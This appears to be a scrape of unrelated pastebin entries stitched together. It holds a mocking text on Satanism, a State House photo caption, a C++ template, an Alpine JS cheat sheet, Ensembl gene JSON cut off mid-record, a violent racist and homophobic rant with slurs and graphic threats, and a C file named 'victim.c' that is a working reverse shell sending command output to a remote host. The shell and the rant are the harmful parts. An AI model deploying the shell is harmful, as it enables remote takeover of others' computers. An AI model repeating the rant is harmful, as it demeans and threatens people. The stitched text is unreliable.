F‎o‎r‎ ‎a‎s‎ ‎l‎o‎n‎g‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎,‎ ‎t‎h‎e‎r‎e‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎t‎h‎o‎s‎e‎ ‎w‎h‎o‎ ‎k‎i‎n‎d‎a‎ ‎w‎e‎n‎t‎ ‎t‎h‎e‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎o‎p‎p‎o‎s‎i‎t‎e‎ ‎d‎i‎r‎e‎c‎t‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎w‎o‎r‎s‎h‎i‎p‎e‎d‎ ‎S‎a‎t‎a‎n‎,‎ ‎a‎s‎ ‎o‎p‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎G‎o‎d‎ ‎-‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎h‎a‎s‎ ‎t‎o‎ ‎r‎o‎o‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎o‎s‎i‎n‎g‎ ‎t‎e‎a‎m‎.‎ ‎T‎h‎e‎s‎e‎ ‎r‎e‎b‎e‎l‎s‎ ‎h‎a‎v‎e‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎b‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎.‎ ‎J‎u‎s‎t‎ ‎l‎i‎k‎e‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎,‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎o‎v‎e‎r‎l‎y‎ ‎d‎e‎f‎e‎n‎s‎i‎v‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎b‎e‎l‎i‎e‎f‎s‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎b‎i‎t‎c‎h‎ ‎a‎b‎o‎u‎t‎ ‎y‎o‎u‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎L‎i‎v‎e‎J‎o‎u‎r‎n‎a‎l‎s‎,‎ ‎s‎h‎o‎u‎l‎d‎ ‎y‎o‎u‎ ‎e‎v‎e‎r‎ ‎c‎r‎o‎s‎s‎ ‎t‎h‎e‎m‎.‎ ‎N‎o‎t‎e‎:‎ ‎t‎h‎e‎ ‎v‎a‎s‎t‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎d‎o‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎w‎o‎r‎s‎h‎i‎p‎ ‎t‎h‎e‎ ‎d‎e‎v‎i‎l‎;‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎b‎a‎s‎i‎c‎a‎l‎l‎y‎ ‎j‎u‎s‎t‎ ‎e‎g‎o‎t‎i‎s‎t‎i‎c‎a‎l‎ ‎a‎t‎h‎e‎i‎s‎t‎s‎ ‎t‎h‎a‎t‎ ‎s‎e‎t‎ ‎o‎u‎t‎ ‎t‎o‎ ‎w‎o‎r‎s‎h‎i‎p‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎a‎s‎ ‎""‎g‎o‎d‎s‎""‎.‎ ‎E‎v‎e‎n‎ ‎t‎h‎e‎ ‎g‎u‎y‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎h‎a‎i‎r‎i‎e‎s‎t‎ ‎s‎l‎a‎b‎ ‎o‎f‎ ‎f‎a‎t‎ ‎b‎e‎l‎o‎w‎ ‎h‎i‎s‎ ‎c‎h‎i‎n‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎a‎s‎ ‎c‎l‎a‎s‎s‎y‎ ‎a‎ ‎f‎e‎d‎o‎r‎a‎ ‎t‎h‎a‎t‎ ‎m‎o‎s‎t‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎p‎o‎s‎s‎e‎s‎s‎.‎

I‎n‎ ‎a‎n‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎p‎r‎o‎v‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎r‎e‎a‎l‎ ‎f‎r‎e‎e‎t‎h‎i‎n‎k‎e‎r‎s‎ ‎w‎h‎i‎l‎e‎ ‎s‎t‎i‎l‎l‎ ‎r‎e‎l‎y‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎e‎o‎u‎s‎ ‎j‎u‎s‎t‎i‎c‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎r‎e‎l‎i‎g‎i‎o‎n‎,‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎a‎v‎e‎ ‎d‎i‎s‎m‎i‎s‎s‎e‎d‎ ‎S‎a‎t‎a‎n‎'‎s‎ ‎s‎t‎o‎r‎y‎ ‎a‎s‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎d‎a‎m‎n‎e‎d‎ ‎l‎i‎e‎ ‎a‎n‎d‎ ‎r‎e‎p‎l‎a‎c‎e‎d‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎,‎ ‎s‎t‎a‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎S‎a‎t‎a‎n‎ ‎w‎a‎s‎,‎ ‎i‎n‎ ‎f‎a‎c‎t‎,‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎m‎i‎n‎d‎ ‎w‎h‎o‎ ‎w‎a‎s‎ ‎c‎a‎s‎t‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎e‎a‎v‎e‎n‎ ‎f‎o‎r‎ ‎d‎a‎r‎i‎n‎g‎ ‎t‎o‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎ ‎G‎o‎d‎,‎ ‎t‎h‎u‎s‎ ‎m‎a‎k‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎ ‎m‎a‎r‎t‎y‎r‎ ‎a‎m‎o‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎e‎e‎p‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎L‎o‎r‎d‎'‎s‎ ‎a‎n‎g‎e‎l‎s‎.‎


(‎(‎ ‎S‎A‎T‎A‎N‎I‎C‎ ‎P‎A‎N‎I‎C‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎,‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎M‎o‎n‎t‎p‎e‎l‎i‎e‎r‎,‎ ‎i‎s‎ ‎t‎h‎e‎ ‎s‎t‎a‎t‎e‎ ‎c‎a‎p‎i‎t‎o‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎s‎t‎a‎t‎e‎ ‎o‎f‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎e‎a‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎G‎e‎n‎e‎r‎a‎l‎ ‎A‎s‎s‎e‎m‎b‎l‎y‎.‎ ‎T‎h‎e‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎G‎r‎e‎e‎k‎ ‎R‎e‎v‎i‎v‎a‎l‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎ ‎i‎s‎ ‎t‎h‎e‎ ‎t‎h‎i‎r‎d‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎s‎i‎t‎e‎ ‎t‎o‎ ‎b‎e‎ ‎u‎s‎e‎d‎ ‎a‎s‎ ‎t‎h‎e‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎.‎ ‎D‎e‎s‎i‎g‎n‎e‎d‎ ‎b‎y‎ ‎T‎h‎o‎m‎a‎s‎ ‎S‎i‎l‎l‎o‎w‎a‎y‎ ‎i‎n‎ ‎1‎8‎5‎7‎ ‎a‎n‎d‎ ‎1‎8‎5‎8‎,‎ ‎i‎t‎ ‎w‎a‎s‎ ‎o‎c‎c‎u‎p‎i‎e‎d‎ ‎i‎n‎ ‎1‎8‎5‎9‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎t‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎i‎n‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎2‎0‎2‎1‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎T‎o‎n‎y‎ ‎J‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎c‎h‎o‎p‎ ‎u‎p‎ ‎s‎o‎m‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎m‎ ‎i‎n‎t‎o‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎ ‎t‎o‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎,‎ ‎t‎h‎e‎n‎ ‎o‎n‎c‎e‎ ‎I‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎,‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎ ‎w‎i‎l‎l‎ ‎s‎h‎i‎t‎ ‎t‎h‎e‎m‎ ‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎s‎h‎e‎ ‎w‎i‎l‎l‎ ‎s‎h‎i‎t‎ ‎o‎u‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎.‎ ‎I‎n‎ ‎w‎h‎i‎c‎h‎ ‎c‎a‎s‎e‎,‎ ‎y‎o‎u‎'‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎p‎u‎k‎e‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎'‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎p‎u‎k‎e‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎o‎n‎c‎e‎ ‎I‎ ‎d‎o‎ ‎t‎h‎a‎t‎,‎ ‎I‎'‎l‎l‎ ‎c‎h‎o‎p‎ ‎b‎o‎t‎h‎ ‎y‎o‎u‎r‎ ‎b‎a‎l‎l‎s‎ ‎o‎f‎f‎ ‎a‎n‎d‎ ‎r‎e‎p‎l‎a‎c‎e‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎t‎w‎o‎ ‎c‎h‎e‎r‎r‎y‎ ‎b‎o‎m‎b‎s‎.‎ ‎T‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎i‎g‎n‎i‎t‎e‎ ‎b‎o‎t‎h‎ ‎t‎h‎e‎ ‎c‎h‎e‎r‎r‎y‎ ‎b‎o‎m‎b‎s‎.‎ ‎A‎t‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎,‎ ‎y‎o‎u‎r‎ ‎o‎r‎g‎a‎n‎s‎ ‎w‎i‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎h‎a‎v‎e‎ ‎b‎l‎o‎w‎n‎ ‎u‎p‎,‎ ‎w‎h‎i‎c‎h‎ ‎I‎ ‎w‎i‎l‎l‎ ‎t‎h‎e‎n‎ ‎s‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎,‎ ‎a‎n‎d‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎p‎a‎y‎ ‎m‎e‎,‎ ‎I‎ ‎w‎i‎l‎l‎ ‎k‎i‎l‎l‎ ‎b‎o‎t‎h‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎p‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎b‎o‎n‎e‎s‎ ‎i‎n‎ ‎a‎ ‎m‎u‎s‎e‎u‎m‎ ‎w‎h‎e‎r‎e‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎c‎a‎n‎ ‎l‎a‎u‎g‎h‎ ‎a‎t‎ ‎t‎h‎e‎m‎ ‎f‎o‎r‎ ‎h‎a‎v‎i‎n‎g‎ ‎m‎o‎n‎k‎e‎y‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎b‎o‎n‎e‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎.‎.‎.‎ ‎Y‎o‎u‎'‎r‎e‎ ‎a‎ ‎f‎a‎g‎g‎o‎t‎.‎"
QHnz87f9,C++,UDAY8755,C++,Saturday 19th of August 2023 08:48:03 AM CDT,"#include<bits/stdc++.h>
using namespace std;
#define fast ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL)
typedef long long ll;
#define pb push_back
#define f first
#define s second
#define  vll vector<ll>
#define  vvll vector<vector<ll>>"
ZwzRfFb3,👨‍💻Alpine JS Click Cheat Sheet,GeekForeverPastebin,JavaScript,Saturday 19th of August 2023 08:41:42 AM CDT,"<script src=""//unpkg.com/alpinejs"" defer></script>

x-data=""{ open: false }""

@click=""open = true""

x-show=""open""

@click.away=""open = false"""
ywHv7JGA,victim/Makefile,FlyFar,Make,Saturday 19th of August 2023 08:34:17 AM CDT,"main: victim.c
	gcc victim.c -lwsock32 -lWs2_32 -o victim.exe"
sTgYK8UX,victim/victim.c,FlyFar,C,Saturday 19th of August 2023 08:33:02 AM CDT,"#define WIN32_LEAN_AND_MEAN

#include <stdlib.h>
#include <stdio.h>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// constants
#define ADDRESS ""192.168.10.7""
#define PORT ""9999""
#define RECV_BUFFER_SIZE 1024
#define SEND_BUFFER_SIZE 8192

int __cdecl main(int argc, char **argv) {
	WSADATA wsa_data;
	SOCKET sock = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	char buffer[RECV_BUFFER_SIZE];
	int status;

	// initialize winsock
	status = WSAStartup(MAKEWORD(2, 2), &wsa_data);

	if (status != 0) {
		printf(""WSAStartup failed with error: %d\n"", status);
		return status;
	}

	// what does the zeromemory thing do
	ZeroMemory(&hints, sizeof(hints));

	// set hints and ai family and socktype and protocol
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// resolve the server address and port
	status = getaddrinfo(ADDRESS, PORT, &hints, &result);

	if (status != 0) {
		printf(""getaddrinfo failed with error: %d\n"", status);
		WSACleanup(); // cleanup winsock i guess
		return status;
	}

	// attempt to connect to an address until it succeeds
	for (ptr = result; ptr != NULL; ptr = ptr -> ai_next) {
		// create a socket
		sock = socket(ptr -> ai_family, ptr -> ai_socktype, ptr -> ai_protocol);

		if (sock == INVALID_SOCKET) {
			printf(""socket failed with error: %ld\n"", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// connect to the server
		status = connect(sock, ptr -> ai_addr, (int)ptr -> ai_addrlen);

		if (status == SOCKET_ERROR) {
			printf(""connect failed with error: %d\n"", WSAGetLastError());
			closesocket(sock);
			sock = INVALID_SOCKET;

			continue;
		}

		break; // we did it
	}

	freeaddrinfo(result); // free the address info

	if (sock == INVALID_SOCKET) { // if we didn't do it
		printf(""Unable to connect to server!\n"");
		WSACleanup();
		return 1;
	}

	FILE *stream;
	char output[SEND_BUFFER_SIZE];
	
	// wait for commands
	do {
		// clear the buffer and output
		memset(buffer, 0, strlen(buffer));
		memset(output, 0, strlen(output));

		status = recv(sock, buffer, RECV_BUFFER_SIZE, 0);

		if (status <= 0) {
			printf(""recv failed with error: %d\n"", WSAGetLastError());
			break; // connection got closed or error
		}
		
		// execute command and get output
		stream = popen(buffer, ""r"");
		fread(output, SEND_BUFFER_SIZE, 1, stream);

		pclose(stream);

		// send output
		status = send(sock, output, (int)strlen(output), 0);

		if (status == SOCKET_ERROR) {
			printf(""send failed with error: %d\n"", WSAGetLastError());
			break; // error when sending output
		}
	} while (status > 0);

	// clean up everything
    closesocket(sock);
    WSACleanup();

	return 0;
}"
XzkwJEmJ,Untitled,Fish_In_A_SUit,JSON,Saturday 19th of August 2023 08:31:17 AM CDT,"Query JSON for: https://rest.ensembl.org/lookup/id/ENSG00000110906?mane=1;expand=1
Use https://www.toptal.com/developers/json-formatter to view.

{
            ""Transcript"": [
                {
                    ""version"": 11,
                    ""display_name"": ""KCTD10-201"",
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""MANE"": [
                        {
                            ""type"": ""MANE_Select"",
                            ""version"": 11,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENST00000228495"",
                            ""start"": 109448655,
                            ""db_type"": ""core"",
                            ""object_type"": ""mane"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""refseq_match"": ""NM_031954.5"",
                            ""end"": 109477300,
                            ""Parent"": ""ENSG00000110906"",
                            ""seq_region_name"": ""12""
                        }
                    ],
                    ""object_type"": ""Transcript"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""ensembl_havana_transcript_homo_sapiens"",
                    ""Translation"": {
                        ""db_type"": ""core"",
                        ""start"": 109451595,
                        ""id"": ""ENSP00000228495"",
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000228495"",
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""length"": 313,
                        ""version"": 6
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""end"": 109477300,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462237"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens""
                        },
                        {
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003475433"",
                            ""start"": 109457992,
                            ""db_type"": ""core""
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462325""
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003593430""
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""db_type"": ""core"",
                            ""start"": 109448655,
                            ""id"": ""ENSE00001250971"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 8
                        }
                    ],
                    ""is_canonical"": 1,
                    ""id"": ""ENST00000228495"",
                    ""source"": ""ensembl_havana"",
                    ""db_type"": ""core"",
                    ""start"": 109448655,
                    ""species"": ""homo_sapiens"",
                    ""end"": 109477300,
                    ""Parent"": ""ENSG00000110906""
                },
                {
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""assembly_name"": ""GRCh38"",
                    ""display_name"": ""KCTD10-208"",
                    ""version"": 5,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458985,
                    ""source"": ""havana"",
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000540089"",
                    ""start"": 109449961,
                    ""db_type"": ""core"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002210914"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458985
                        },
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003459435"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109449961,
                            ""id"": ""ENSE00002297724"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        }
                    ],
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 132,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""Parent"": ""ENST00000540089"",
                        ""end"": 109456297,
                        ""id"": ""ENSP00000439722"",
                        ""db_type"": ""core"",
                        ""start"": 109451595
                    },
                    ""biotype"": ""protein_coding""
                },
                {
                    ""version"": 5,
                    ""display_name"": ""KCTD10-216"",
                    ""assembly_name"": ""GRCh38"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""biotype"": ""retained_intron"",
                    ""Exon"": [
                        {
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002212843"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""end"": 109459629,
                            ""seq_region_name"": ""12"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109449971,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003552737"",
                            ""version"": 1
                        }
                    ],
                    ""start"": 109449971,
                    ""db_type"": ""core"",
                    ""is_canonical"": 0,
                    ""source"": ""havana"",
                    ""id"": ""ENST00000545759"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109459629,
                    ""species"": ""homo_sapiens""
                },
                {
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109477359,
                    ""species"": ""homo_sapiens"",
                    ""db_type"": ""core"",
                    ""start"": 109449971,
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000440541"",
                    ""source"": ""havana"",
                    ""Exon"": [
                        {
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109477359,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00000997910"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""version"": 7
                        },
                        {
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003462237"",
                            ""assembly_name"": ""GRCh38"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109457992,
                            ""id"": ""ENSE00003470887"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003664767"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""end"": 109456313,
                            ""seq_region_name"": ""12"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003478591"",
                            ""db_type"": ""core"",
                            ""start"": 109456118
                        },
                        {
                            ""version"": 1,
                            ""start"": 109449971,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003552737"",
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1
                        }
                    ],
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Translation"": {
                        ""version"": 2,
                        ""length"": 77,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000440541"",
                        ""id"": ""ENSP00000390321"",
                        ""start"": 109458062,
                        ""db_type"": ""core""
                    },
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""assembly_name"": ""GRCh38"",
                    ""version"": 6,
                    ""display_name"": ""KCTD10-202""
                },
                {
                    ""version"": 5,
                    ""display_name"": ""KCTD10-205"",
                    ""assembly_name"": ""GRCh38"",
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""strand"": -1,
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""Translation"": {
                        ""length"": 64,
                        ""version"": 1,
                        ""id"": ""ENSP00000474497"",
                        ""start"": 109471186,
                        ""db_type"": ""core"",
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""Parent"": ""ENST00000537165"",
                        ""end"": 109477262
                    },
                    ""biotype"": ""nonsense_mediated_decay"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""start"": 109477260,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
